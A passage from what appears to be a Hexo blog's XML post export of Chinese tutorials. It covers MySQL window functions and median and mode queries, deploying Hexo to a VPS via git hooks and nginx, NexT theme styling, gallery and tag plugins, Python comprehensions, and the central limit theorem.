|+----------+---------+--------+---------------------+------------+------------+------------+------------+前后函数lag()、lead()lag(column,n)获取当前数据行按照某种排序规则的上n行数据的某个字段lead(column,n)获取当前数据行按照某种排序规则的下n行数据的某个字段应用场景：按照时间排序，获取当前订单的上一笔订单发生时间和下一笔订单发生时间，（可以计算订单的时间上的间隔度或者说买买买的频繁程度）。123456select order_id,user_no,amount,create_date,lag(create_date,1) over w 'last_transaction_time',lead(create_date,1) over w 'next_transaction_time'from order_infowindow w as (partition by user_no order by create_date asc);1234567891011121314+----------+---------+--------+---------------------+-----------------------+-----------------------+| order_id | user_no | amount | create_date | last_transaction_time | next_transaction_time |+----------+---------+--------+---------------------+-----------------------+-----------------------+| 1 | u0001 | 100 | 2018-01-01 00:00:00 | NULL | 2018-01-02 00:00:00 || 2 | u0001 | 300 | 2018-01-02 00:00:00 | 2018-01-01 00:00:00 | 2018-01-02 00:00:00 || 3 | u0001 | 300 | 2018-01-02 00:00:00 | 2018-01-02 00:00:00 | 2018-01-10 00:00:00 || 4 | u0001 | 800 | 2018-01-10 00:00:00 | 2018-01-02 00:00:00 | 2018-01-20 00:00:00 || 5 | u0001 | 900 | 2018-01-20 00:00:00 | 2018-01-10 00:00:00 | NULL || 6 | u0002 | 500 | 2018-01-05 00:00:00 | NULL | 2018-01-06 00:00:00 || 7 | u0002 | 600 | 2018-01-06 00:00:00 | 2018-01-05 00:00:00 | 2018-01-10 00:00:00 || 8 | u0002 | 300 | 2018-01-10 00:00:00 | 2018-01-06 00:00:00 | 2018-01-16 00:00:00 || 9 | u0002 | 800 | 2018-01-16 00:00:00 | 2018-01-10 00:00:00 | 2018-01-22 00:00:00 || 10 | u0002 | 800 | 2018-01-22 00:00:00 | 2018-01-16 00:00:00 | NULL |+----------+---------+--------+---------------------+-----------------------+-----------------------+头尾函数first_value()、last_value()头尾函数可以得到分区中的第一个/最后一个指定参数的值。应用场景：查询截止到当前订单，按照日期排序第一个订单和最后一个订单的订单金额。123456select order_id,user_no,amount,create_date,first_value(create_date) over w 'first_transaction_time',last_value(create_date) over w 'last_transaction_time'from order_infowindow w as (partition by user_no order by create_date asc);1234567891011121314+----------+---------+--------+---------------------+------------------------+-----------------------+| order_id | user_no | amount | create_date | first_transaction_time | last_transaction_time |+----------+---------+--------+---------------------+------------------------+-----------------------+| 1 | u0001 | 100 | 2018-01-01 00:00:00 | 2018-01-01 00:00:00 | 2018-01-01 00:00:00 || 2 | u0001 | 300 | 2018-01-02 00:00:00 | 2018-01-01 00:00:00 | 2018-01-02 00:00:00 || 3 | u0001 | 300 | 2018-01-02 00:00:00 | 2018-01-01 00:00:00 | 2018-01-02 00:00:00 || 4 | u0001 | 800 | 2018-01-10 00:00:00 | 2018-01-01 00:00:00 | 2018-01-10 00:00:00 || 5 | u0001 | 900 | 2018-01-20 00:00:00 | 2018-01-01 00:00:00 | 2018-01-20 00:00:00 || 6 | u0002 | 500 | 2018-01-05 00:00:00 | 2018-01-05 00:00:00 | 2018-01-05 00:00:00 || 7 | u0002 | 600 | 2018-01-06 00:00:00 | 2018-01-05 00:00:00 | 2018-01-06 00:00:00 || 8 | u0002 | 300 | 2018-01-10 00:00:00 | 2018-01-05 00:00:00 | 2018-01-10 00:00:00 || 9 | u0002 | 800 | 2018-01-16 00:00:00 | 2018-01-05 00:00:00 | 2018-01-16 00:00:00 || 10 | u0002 | 800 | 2018-01-22 00:00:00 | 2018-01-05 00:00:00 | 2018-01-22 00:00:00 |+----------+---------+--------+---------------------+------------------------+-----------------------+注意：如果不加order by, 就没有窗口，计算范围是整个分区；如果加上order by, 默认窗口是range between unbounded preceding and current row，就是排序后从分区第一行一直到当前行为止。由于我们需要求的是每个用户的第一个和最后一个订单，所以这里要指定窗口：从第一行unbounded preceding到最后一行unbounded following。123456select order_id,user_no,amount,create_date,first_value(create_date) over w 'first_transaction_time',last_value(create_date) over w 'last_transaction_time'from order_infowindow w as (partition by user_no order by create_date asc rows between unbounded preceding and unbounded following);1234567891011121314+----------+---------+--------+---------------------+------------------------+-----------------------+| order_id | user_no | amount | create_date | first_transaction_time | last_transaction_time |+----------+---------+--------+---------------------+------------------------+-----------------------+| 1 | u0001 | 100 | 2018-01-01 00:00:00 | 2018-01-01 00:00:00 | 2018-01-20 00:00:00 || 2 | u0001 | 300 | 2018-01-02 00:00:00 | 2018-01-01 00:00:00 | 2018-01-20 00:00:00 || 3 | u0001 | 300 | 2018-01-02 00:00:00 | 2018-01-01 00:00:00 | 2018-01-20 00:00:00 || 4 | u0001 | 800 | 2018-01-10 00:00:00 | 2018-01-01 00:00:00 | 2018-01-20 00:00:00 || 5 | u0001 | 900 | 2018-01-20 00:00:00 | 2018-01-01 00:00:00 | 2018-01-20 00:00:00 || 6 | u0002 | 500 | 2018-01-05 00:00:00 | 2018-01-05 00:00:00 | 2018-01-22 00:00:00 || 7 | u0002 | 600 | 2018-01-06 00:00:00 | 2018-01-05 00:00:00 | 2018-01-22 00:00:00 || 8 | u0002 | 300 | 2018-01-10 00:00:00 | 2018-01-05 00:00:00 | 2018-01-22 00:00:00 || 9 | u0002 | 800 | 2018-01-16 00:00:00 | 2018-01-05 00:00:00 | 2018-01-22 00:00:00 || 10 | u0002 | 800 | 2018-01-22 00:00:00 | 2018-01-05 00:00:00 | 2018-01-22 00:00:00 |+----------+---------+--------+---------------------+------------------------+-----------------------+参考MySQL 8.0 窗口函数：用非常规思维简易实现SQL需求MySQL 8.0 新增SQL语法对窗口函数和CTE的支持]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客部署到VPS]]></title>
    <url>%2Farchives%2F12a4e7e6.html</url>
    <content type="text"><![CDATA[网上大部分教程都是将Hexo部署到GitHub Pages上面，本文主要介绍如何部署到VPS。VPS环境：Ubuntu 16.04。准备工作网上流传的武功秘籍分为两种：将Hexo项目上传到VPS上面后执行 hexo server，之后配置Nginx反向代理，让域名指向 http://localhost:4000。将Hexo在本地通过 hexo generate 生成静态文件，在通过 hexo deploy 部署到VPS上面，使用Nginx直接做Web服务器。相比第二种方式，第一种每次写博客与更新博客时候的操作会很繁琐。所以我们使用第二种方式进行部署，这样既可以将静态文件deploy到VPS上，也可以上传到Github上用作备份，操作性和安全性上都要胜于前者。而对于第二种方式而言，常用的又有 git hook 和 rsync 两种自动部署解决方案。本文主要介绍git hook部署过程。Git Hooks自动部署部署原理我们在本地编辑文本，然后使用Git远程部署到VPS的Git仓库。hexo d命令实际上只deploy了本地的public文件夹，Git Hooks实际上就是当Git仓库收到最新的push时，将Git仓库接受到的内容复制到VPS上的网站目录内。相当于完成了手动将public文件夹复制到VPS的网站根目录里。安装配置Git安装Git通过SSH连接VPS，执行：apt-get install git，完成后通过git --version查看Git版本，若显示版本信息则说明安装成功。创建git用户执行：adduser git，根据提示设置密码。赋予git用户sudo权限执行：12chmod 740 /etc/sudoersvim /etc/sudoers找到以下内容：12# User privilege specificationroot ALL=(ALL:ALL) ALL在root ALL=(ALL:ALL) ALL这一行下面添加git ALL=(ALL:ALL) ALL保存退出后，修改回文件权限：1chmod 440 /etc/sudoers关闭git用户shell权限我们也可以通过：1ssh git@VPS IPssh连接服务器，登录到服务器上，对服务器进行各种操作，这通常很不安全,也不合适，我们只需要能对仓库操作就可以了，不需要更大的权限。因此我们关闭git用户shell权限，执行：1vim /etc/passwd将最后一行的git:x:1001:1001:,,,:/home/git:/bin/bash修改为git:x:1001:1001:,,,:/home/git:/usr/bin/git-shell这样，git用户可以正常通过ssh使用git，但无法登录shell，因为我们为git用户指定的git-shell每次一登录就自动退出。初始化git仓库1234cd /home/git //切换到git用户目录mkdir blog.git //创建git仓库文件夹，以blog.git为例cd blog.git //进入仓库目录git init --bare //使用--bare参数初始化为裸仓库，这样创建的仓库不包含工作区注意：裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以.git结尾。创建网站目录12cd /var/www/ //切换目录mkdir blog //创建网站目录，以blog为例配置SSH1234cd /home/git //切换到git用户目录mkdir .ssh //创建.ssh目录cd .sshvim authorized_keys然后将本地的公钥复制到authorized_keys文件里(公钥即本地执行cat ~/.ssh/id_rsa.pub查看的内容)。注意：收集所有需要登录的用户的公钥，就是他们自己的id_rsa.pub文件，把所有公钥导入到/home/git/.ssh/authorized_keys文件里，一行一个。用户组管理12ll /home/git/ll /var/www/确保blog.git、.ssh、blog目录的用户组权限为git:git，若不是，执行下列命令：修改用户权限的命令：12&gt;chown -R 用户名.组名 /目录&gt;123chown -R git.git /home/git/blog.git/chown -R git.git /home/git/.ssh/chown -R git.git /var/www/blog/安装配置nginx安装nginx执行：apt-get install nginx，若输入nginx -V可以看到nginx版本信息，则安装成功。配置nginx执行：123cd /etc/nginx/sites-available //切换目录cp default default.bak //备份默认配置vim default //修改配置参考配置文件内容：1234567891011121314151617181920212223242526272829303132server &#123; listen 80 default; #默认监听80端口 root /var/www/blog; #网站根目录 server_name tding.top, www.tding.top; #网址 access_log /var/log/nginx/blog_access.log; error_log /var/log/nginx/blog_error.log; error_page 404 = /404.html; location ~* ^.+\.(ico|gif|jpg|jpeg|png)$ &#123; root /var/www/blog; access_log off; expires 1d; &#125; location ~* ^.+\.(css|js|txt|xml|swf|wav)$ &#123; root /var/www/blog; access_log off; expires 10m; &#125; location / &#123; root /var/www/blog; if (-f $request_filename) &#123; rewrite ^/(.*)$ /$1 break; &#125; &#125; location /nginx_status &#123; stub_status on; access_log off; &#125;&#125;保存退出后，启动nginx：1systemctl start nginx设置开机自动启动：1systemctl enable nginx查看运行状态：1systemctl status nginx显示running表示成功运行。配置Git Hooks创建post-receive文件git用户下执行（这里我用root用户执行上述命令，然后更改了文件所有者为git.git）：12cd /home/git/blog.git/hooks //切换到hooks目录下vim post-receive //创建文件复制下面的内容到post-receive文件中：1234567891011#!/bin/bashecho &quot;post-receive hook is running...&quot;GIT_REPO=/home/git/blog.gitTMP_GIT_CLONE=/tmp/blogPUBLIC_WWW=/var/www/blogrm -rf $&#123;TMP_GIT_CLONE&#125;git clone $GIT_REPO $TMP_GIT_CLONErm -rf $&#123;PUBLIC_WWW&#125;/*cp -rf $&#123;TMP_GIT_CLONE&#125;/* $&#123;PUBLIC_WWW&#125;为什么不直接将裸仓库克隆到 Web 根目录下呢？我之前也一直被这个问题困扰，感觉先克隆到 tmp 目录再拷贝到 Web 根目录是多此一举。后来我觉得可能是出于项目安全的考虑，在执行 cp 命令的时候，.git 作为隐藏目录不会被拷贝到 Web 根目录下，也就避免了将整个仓库历史暴露在 Web 服务中。赋予可执行权限：1chmod +x post-receive本地操作尝试连接在本地打开Git Bash：1ssh git@VPS的ip若默认端口不是22，则需要在后面加上-p 端口号：1ssh git@VPS的ip -p 2022或者在.ssh文件夹下创建一个config文件，内容如下：12345Host 服务器IPHostName 服务器IPUser gitPort 端口号IdentityFile ~/.ssh/id_rsa这里可能会出现以下错误：12345678910IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!Someone could be eavesdropping on you right now (man-in-the-middle attack)!It is also possible that a host key has just been changed.The fingerprint for the ECDSA key sent by the remote host isSHA256:NgaCW7iTlWetUGGkX1uHepNs88G/pCYa9zrDouTQvhM.Please contact your system administrator.Add correct host key in /c/Users/dta05/.ssh/known_hosts to get rid of this message.Offending ECDSA key in /c/Users/dta05/.ssh/known_hosts:6ECDSA host key for [167.xxx.xxx.xxx]:2022 has changed and you have requested strict checking.Host key verification failed.原因分析：It is also possible that a host key has just been changed.我之前对ssh服务器重装了系统，导致所有与原系统建立过ssh连接的系统都无法再建立连接，因为在于原系统建立首次连接时，双方相互记录了对方的公钥（ssh基于非对称密钥技术），在ssh服务主机重装系统后，公钥改变了，任以旧版本公钥的主机自然是无法与新系统连接的。网上还有分析为ssh主机被人黑了，并在消除入侵记录时对known_hosts文件做了改动。解决方案：删除~/.ssh/known_hosts文件，或者如果你可以判断出known_hosts中原ssh服务器的公钥，删去那部分，然后再次建立新的连接，即可获得新的公钥。配置Hexo打开本地博客根目录下的_config.yml文件，找到最后的deploy配置，修改为：1234567# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git # repo: git@VPS IP:/~/blog.git # 默认端口生效使用 # repo: ssh://git@VPS IP:端口/~/blog.git # 默认端口不生效使用，设置端口 branch: master到此，Hexo建站就全部配置部署完毕了。参考Deploy Hexo Blog to VPS |部署Hexo博客到VPS搭建Git服务器Hexo搭建个人博客并使用Git部署到VPS]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>VPS</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-NexT设置博客背景图片]]></title>
    <url>%2Farchives%2F761b6f4d.html</url>
    <content type="text"><![CDATA[NexT主题本身是没有背景图片的，显得有点单调，一个个性化的背景图片，会让博客变得美观不少。Hexo-NexT主题版本：7.1.2设置背景图片将想要的背景图片放入themes/next/source/images。打开themes/next/source/css/ _custom/custom.styl文件，这个是Next故意留给用户自己个性化定制一些样式的文件，添加以下代码即可：1234567body &#123; background:url(/images/yourbackground.jpg); background-repeat: no-repeat; background-attachment:fixed; //不重复 background-size: cover; //填充 background-position:50% 50%;&#125;background:url为图片路径，也可以直接使用链接。background-repeat：若果背景图片不能全屏，那么是否平铺显示，充满屏幕background-attachment：背景是否随着网页上下滚动而滚动，fixed为固定background-size：图片展示大小，这里设置100%，100%的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示。博客内容透明化NexT主题的博客文章均是不透明的，这样读者就不能好好欣赏背景图片了，下面的方法可以使博客内容透明化：在themes/next/source/css/_custom/custom.styl中添加以下内容：1234567891011121314151617181920//博客内容透明化//文章内容的透明度设置.content-wrap &#123; opacity: 0.9;&#125;//侧边框的透明度设置.sidebar &#123; opacity: 0.9;&#125;//菜单栏的透明度设置.header-inner &#123; background: rgba(255,255,255,0.9);&#125;//搜索框（local-search）的透明度设置.popup &#123; opacity: 0.9;&#125;注意：其中header-inner不能使用opacity进行配置。因为header-inner包含header.swig中的所有内容。若使用opacity进行配置，子结点会出很多问题。参考Hexo-NexT主题自定义配置高阶教程]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-NexT实现相册]]></title>
    <url>%2Farchives%2F607c3b85.html</url>
    <content type="text"><![CDATA[准备工作本节内容是基于实现本地保存图片功能前提记录的笔记，如果是用图床外链，可以跳过所有涉及到img文件夹以及img/s文件夹的步骤。本相册的所有功能均仅测试了在hexo-theme-next下实现的效果，使用其它主题时部分布局尺寸数据可能会出现偏差，需要自行根据主题设置修改。创建目录在 git bash 中输入命令hexo new page gallery；在hexo/sourse/gallery目录下建立你需要的分类相册文件夹；进入hexo/sourse/gallery目录，新建img文件夹用来存放相册封面；在每个相册文件夹中创建img文件夹用来存放大图，以及img/s文件夹用来存放缩略图。注意：img/s文件夹可以省略不建，用文件名-s.jpg的格式重命名缩略图即可。图片处理原图处理将需要上传的图片放入gallery/相册名/img文件夹中，为了加载速度建议压缩至 1mb 以下，使用 jpg 格式保存；除了文件大小以外没有其它要求，但是为了方便后续页面编辑，建议将文件以容易辨识的方式重命名，例如日期-图片名.jpg。缩略图处理将gallery/相册名/img下的所有图片复制到gallery/相册名/img/s文件夹中，使用 PS 等其它处理工具压缩图片大小；建议宽度为 300px，最终输出文件大小在 30kb 左右，高度无要求。封面图处理从每个相册的缩略图中挑选需要的封面，复制到gallery/img文件夹中；建议重命名为相册名.jpg。相册主界面打开gallery/index.md，将title设置成你需要的相册页面名称；（可选）在日期下方加上comments: false关闭评论；复制以下代码粘贴至正文，并按需求修改相册描述、相册名、相册文件夹名以及封面图文件名：12345678910111213141516171819202122232425262728293031323334&lt;center&gt;！相册描述【此行可删除】&lt;/center&gt;&lt;center&gt;自定义分隔符【此行可删除】&lt;/center&gt;&lt;div class="gallery-page"&gt; &lt;div class="gallery-list"&gt; &lt;div class="gallery-column"&gt; &lt;div class="gallery-item"&gt; &lt;a href="【！相册文件夹名】"&gt;&lt;img src="img/【！封面图文件名】.jpg"&gt; &lt;/a&gt; &lt;p&gt;- ！相册1 -&lt;/p&gt; &lt;/div&gt; &lt;div class="gallery-item"&gt; &lt;a href="【！相册文件夹名】"&gt;&lt;img src="img/【！封面图文件名】.jpg"&gt; &lt;/a&gt; &lt;p&gt;- ！相册2 -&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="gallery-column"&gt; &lt;div class="gallery-item"&gt; &lt;a href="sample"&gt;&lt;img src="img/sample.jpg"&gt; &lt;/a&gt; &lt;p&gt;- 相册名 -&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="gallery-column"&gt; &lt;div class="gallery-item"&gt; &lt;a href="sample"&gt;&lt;img src="img/sample.jpg"&gt; &lt;/a&gt; &lt;p&gt;- 相册名 -&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;center&gt;自定义分割线【此行可删除】&lt;/center&gt;需要使用外链的场合，将&lt;img src=&quot;img/【封面图文件名】.jpg&quot;&gt;中的内容替换为图床外链地址即可；代码中&lt;div class=&quot;gallery-column&quot;&gt;元素为分列显示相册的列数，可按需要增减；新增相册时请确认代码添加在&lt;div class=&quot;gallery-column&quot;&gt;元素内部，否则会造成显示错误。分类相册界面打开gallery/相册名/index.md，将title设置成你需要的相册页面名称；（可选）在日期下方加上comments: false关闭评论；复制以下代码粘贴至正文，并按需求修改相册描述、图片名以及缩略图文件名：12345678910111213141516&lt;center&gt;！相册描述【此行可删除】&lt;/center&gt;&lt;center&gt;自定义分隔符【此行可删除】&lt;/center&gt;&lt;div class="gallery-page"&gt; &lt;div class="img-list"&gt; &lt;div class="img-column"&gt; &lt;a href="img/【！图片名1】.jpg" target="_Blank"&gt;&lt;img src="img/s/【！缩略图文件名1】.jpg"&gt;&lt;/a&gt; &lt;a href="img/【！图片名2】.jpg" target="_Blank"&gt;&lt;img src="img/s/【！缩略图文件名2】.jpg"&gt;&lt;/a&gt; &lt;/div&gt; &lt;div class="img-column"&gt; &lt;a href="img/sample.jpg" target="_Blank"&gt;&lt;img src="img/s/sample.jpg"&gt;&lt;/a&gt; &lt;/div&gt; &lt;div class="img-column"&gt; &lt;a href="img/sample.jpg" target="_Blank"&gt;&lt;img src="img/s/sample.jpg"&gt;&lt;/a&gt; &lt;/div&gt;&lt;/div&gt;&lt;center&gt;自定义分割线【此行可删除】&lt;/center&gt;需要使用外链的场合，将&lt;img src=&quot;img/【图片名】.jpg&quot;&gt;中的内容替换为图床外链地址即可，如果图床加载速度够快可以用同一个链接填充缩略图部分；代码中&lt;div class=&quot;img-column&quot;&gt;元素为分列显示图片的列数，可按需要增减；添加图片时请确认代码添加在&lt;div class=&quot;img-column&quot;&gt;元素内部，否则会造成显示错误。CSS 样式在custom.styl中加入如下代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445/*gallery*/.gallery-page &#123; margin-top: -50px;&#125;.img-list,.gallery-list &#123; display: flex; flex-direction: row; flex-wrap: nowrap; align-items: flex-start;&#125;.img-column &#123; display: flex; flex-direction: column-reverse;&#125;.img-column a,.gallery-column a &#123; border-bottom: 0px;&#125;.gallery-item &#123; margin-bottom: -50px&#125;.gallery-item p &#123; margin: -25px auto -10px; max-width: 50%; text-align: center; font-size: 15px; color: $black-deep; background: rgba(255,255,255,.3); border-radius: 7px; border: 1px solid $black-deep; box-shadow: 0 8px 20px -8px rgba(0,0,0,.3);&#125;.posts-expand .post-body .gallery-column a img &#123; height: 250px; width: 300px; object-fit: cover;&#125;@media (max-width: 767px)&#123; .gallery-item p &#123; min-width: 75px; font-size: 13px; &#125;&#125;@media标签内的样式是防止移动端浏览时相册名被强制换行的，建议保留；其余样式除了 flex 相关行与object-fit样式以外，均可根据需要自行更改，在此不作赘述。模板文档为了更好地普及本相册做了一个模板文档，用的是 google Drive 链接，【点我下载】。本文转载于：css+markdown 实现 hexo 相册【进阶篇】]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-NexT Tag 插件的使用]]></title>
    <url>%2Farchives%2F29bfe8c9.html</url>
    <content type="text"><![CDATA[Tag Plugin 是一种使 Hexo 支持特殊样式内容的方法。例如，我们无法在标准 Markdown 中显示具有自定义尺寸的图像。然后我们可以使用标签插件来解决它。 Hexo 有很多可以帮助用户的标签。 Hexo 还具有主题接口，使主题能够创建自己的标签。文本居中引用-Centered Quote使用方法：1&#123;% cq %&#125;世间所有的相遇，都是久别重逢&#123;% endcq %&#125;显示效果：世间所有的相遇，都是久别重逢提示块-Note使用方法：1234567891011121314151617181920212223&#123;% note default %&#125;default 提示块标签&#123;% endnote %&#125;&#123;% note primary %&#125;primary 提示块标签&#123;% endnote %&#125;&#123;% note success %&#125;success 提示块标签&#123;% endnote %&#125;&#123;% note info %&#125;info 提示块标签&#123;% endnote %&#125;&#123;% note warning %&#125;warning 提示块标签&#123;% endnote %&#125;&#123;% note danger %&#125;danger 提示块标签&#123;% endnote %&#125;主题配置文件中可以修改风格：12345678910111213141516# Note tag (bs-callout).note: # Note tag style values: # - simple bs-callout old alert style. Default. # - modern bs-callout new (v2-v3) alert style. # - flat flat callout style with background, like on Mozilla or StackOverflow. # - disabled disable all CSS styles import of note tag. # 风格 style: flat # 要不要图标 icons: true # 圆角矩形 border_radius: 3 # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6). # Offset also applied to label tag variables. This option can work with disabled note tag. light_bg_offset: 0显示效果：default 提示块标签primary 提示块标签success 提示块标签info 提示块标签warning 提示块标签danger 提示块标签标签-Label使用方法：12&#123;% label default@默认 %&#125; &#123;% label primary@主要 %&#125; &#123;% label success@成功 %&#125; &#123;% label info@信息 %&#125; &#123;% label warning@警告 %&#125; &#123;% label danger@危险 %&#125; &#123;% label success@这是成功的信息%&#125;显示效果：默认 主要 成功 信息 警告 危险 这是成功的信息选项卡-Tabs使用方法：1234567891011&#123;% tabs tab,1 %&#125; 名字为tab，默认在第1个选项卡，如果是-1则隐藏&lt;!-- tab --&gt;**选项卡 1** &lt;!-- endtab --&gt;&lt;!-- tab --&gt;**选项卡 2**&lt;!-- endtab --&gt;&lt;!-- tab A --&gt;**选项卡 3** 名字为A&lt;!-- endtab --&gt;&#123;% endtabs %&#125;主题配置文件：1234567# Tabs tagtabs: enable: true transition: tabs: true labels: true border_radius: 0显示效果：tab 1tab 2A选项卡 1选项卡 2选项卡 3 名字为A按钮-Button使用方法：1&#123;% button url, text, icon [class], [title] %&#125;url : 绝对或相对URLtext : 按钮文字，如果未指定图标则为必须icon : FontAwesome图标名称（开头没有’fa-‘）。如果未指定文本，则为必需[class] : FontAwesome类：fa-fw | fa-lg | fa-2x | fa-3x | fa-4x | fa-5X ，可选参数。[title] : 鼠标悬停时的工具提示，可选参数。注意：最好添加&lt;div&gt;标签，测试时没加 div，下面显示不完全，加上非常美观。一个示例：1&lt;div&gt;&#123;% button https://tding.top/ ,首页,home fa-fw,这是小丁的个人博客首页%&#125;&lt;/div&gt;显示效果：首页多个按钮居中显示：1&lt;div class=&quot;text-center&quot;&gt;&lt;div&gt;&#123;% button https://tding.top/ ,首页,home fa-fw,这是小丁的个人博客首页%&#125; &#123;% button https://tding.top/movies/ ,观影,film fa-fw,豆瓣电影%&#125; &#123;% button https://tding.top/books/ ,阅读,book fa-fw,豆瓣读书%&#125;&lt;/div&gt;&lt;/div&gt;首页 观影 阅读]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python推导式]]></title>
    <url>%2Farchives%2F47bf1d93.html</url>
    <content type="text"><![CDATA[推导式（又称解析式）是Python的一种独有特性。推导式是可以从一个数据序列构建另一个新的数据序列的结构体。一共有三种推导式：列表(list)推导式字典(dict)推导式集合(set)推导式列表推导式列表推导式（又称列表解析式）提供了一种简明扼要的方法来创建列表。它的结构是在一个中括号里包含一个表达式，然后是一个for语句，然后是0个或多个for或者if语句。那个表达式可以是任意的，意思是你可以在列表中放入任意类型的对象。返回结果将是一个新的列表，在这个以if和for语句为上下文的表达式运行完成之后产生。规范形式1variable = [out_exp for out_exp in input_list if out_exp == 2]不使用列表推导式的例子&#123;cmd123a = []for x in range(10): a.append(x**2)1[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]列表推导式例子&#123;cmd1a = [x**2 for x in range(10)]1[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]字典推导式字典推导和列表推导的使用方法是类似的。快速对换一个字典的键和值的例子&#123;cmd123a_dict = &#123;'a': 10, 'b': 34&#125;b_dict = &#123;v: k for k, v in a_dict.items()&#125;1&#123;10: &apos;a&apos;, 34: &apos;b&apos;&#125;集合推导式集合推导式跟列表推导式也是类似的。 唯一的区别在于它们使用大括号{}。&#123;cmd1a = &#123;x**2 for x in [1, 1, 2]&#125;1&#123;1, 4&#125;参考各种推导式(comprehensions)]]></content>
      <categories>
        <category>Python</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL求中位数、众数]]></title>
    <url>%2Farchives%2F53e2b511.html</url>
    <content type="text"><![CDATA[MySQL并未内置计算中位数、众数的函数。因此，我们需要自己创建查询。MySQL插入测试数据12345678910111213CREATE TABLE `income` ( `name` VARCHAR(10) NOT NULL DEFAULT '', `income` INT(11) NOT NULL DEFAULT '0') ENGINE = InnoDB DEFAULT CHARSET = utf8; INSERT INTO test.income (name, income) VALUES ('麻子', 20000);INSERT INTO test.income (name, income) VALUES ('李四', 12000);INSERT INTO test.income (name, income) VALUES ('张三', 10000);INSERT INTO test.income (name, income) VALUES ('王二', 16000);INSERT INTO test.income (name, income) VALUES ('王五', 16000);INSERT INTO test.income (name, income) VALUES ('土豪', 40000);12345678910+--------+--------+| name | income |+--------+--------+| 麻子 | 20000 || 李四 | 12000 || 张三 | 10000 || 王二 | 16000 || 土豪 | 40000 || 王五 | 16000 |+--------+--------+中位数查询具体题目分析假如我们想从“income”列中查找中位数。来看看我们要创建的查询是什么算法：对“income”排序并为排序后的每一行附加序号(行号)如果总行数是奇数，找到位于有序列表中间位置的值。如果总行数是偶数，找到位于有序列表中间两个位置的值。计算上面第 (2) 步和第 (3) 取得值的平均值。返回这个平均值，它就是中位数。MySQL实现中位数查询12345678910SET @rownum := -1; SELECT AVG(t.income)FROM ( SELECT @rownum:=@rownum + 1 AS rowindex,income.income AS income FROM income ORDER BY income.income ) AS tWHERE t.rowindex IN (FLOOR(@rownum / 2) , CEIL(@rownum / 2));12345+---------------+| AVG(t.income) |+---------------+| 16000.0000 |+---------------+下面解释一下上面的代码：先从内部的一个子查询开始 —— 为 @rowindex 赋值的子查询会为每个收入赋予一个自增后的序号，并对 income 排序。有了排好序的收入列表之后，外层查询会获取位中间位置的值。如果数组元素是奇数个，两个值都是取的位于正中那个值。然后，外层查询的 SELECT 子句返回上述两个值的平均值作为中位数。众数查询MySQL实现众数查询12345678910111213SELECT income,COUNT(income)FROM incomeGROUP BY incomeHAVING COUNT(income) &gt;= ( SELECT MAX(t1.cnt) FROM ( SELECT COUNT(*) AS cnt FROM income GROUP BY income ) AS t1 );12345+--------+---------------+| income | COUNT(income) |+--------+---------------+| 16000 | 2 |+--------+---------------+]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[样本均值分布与中心极限定理]]></title>
    <url>%2Farchives%2F318992ca.html</url>
    <content type="text"><![CDATA[本文简单介绍正态分布的样本均值分布和中心极限定理。一、正态分布的样本均值分布$\overline{X}$的抽样分布（sampling distribution）仍为正态分布，$\overline{X}$的数学期望为$\mu$, 方差为$\sigma^{2} / n$，则$$\overline{X} \sim N\left(\mu, \frac{\sigma^{2}}{n}\right)$$上面的结果表明，$\overline{X}$的期望值与总体均值相同，而方差则缩小为总体方差的 1/n。这说明当用样本均值$\overline{X}$去估计总体均值$\mu$时，平均来说没有偏差（这一点 称为无偏性）；当n越来越大时，$\overline{X}$的散布程度越来越小，即用$\overline{X}$估计$\mu$越来越准确。然而在实际问题中，总体的分布并不总是正态分布或近似正态分布，此时$\overline{X}$的分布也将取决于总体分布的情况。值得庆幸的是，当抽样个数n比较大时，人们证明了如下的中心极限定理。该定理告诉我们不管总体的分布是什么，此时样本均值$\overline{X}$的分布总是近似正态分布，只要总体的方差$\sigma^{2}$有限。因为无论对什么总体分布，设总体均值为$\mu$,，总体方差为$\sigma^{2}$，总有$$E(\overline{X})=E\left(\frac{1}{n} \sum_{i=1}^{n} X_{i}\right)=\frac{1}{n} \sum_{i=1}^{n} E\left(X_{i}\right)=\mu$$$$D(\overline{\boldsymbol{X}})=D\left(\frac{1}{n} \sum_{i=1}^{n} X_{i}\right)=\frac{1}{n^{2}} \sum_{i=1}^{n} D\left(X_{i}\right)=\frac{\sigma^{2}}{n}$$所以当n比较大时，$\overline{X}$近似服从$N\left(\mu, \frac{\sigma^{2}}{n}\right)$，等价地有$\frac{X-\mu}{\sigma / \sqrt{n}} \sim 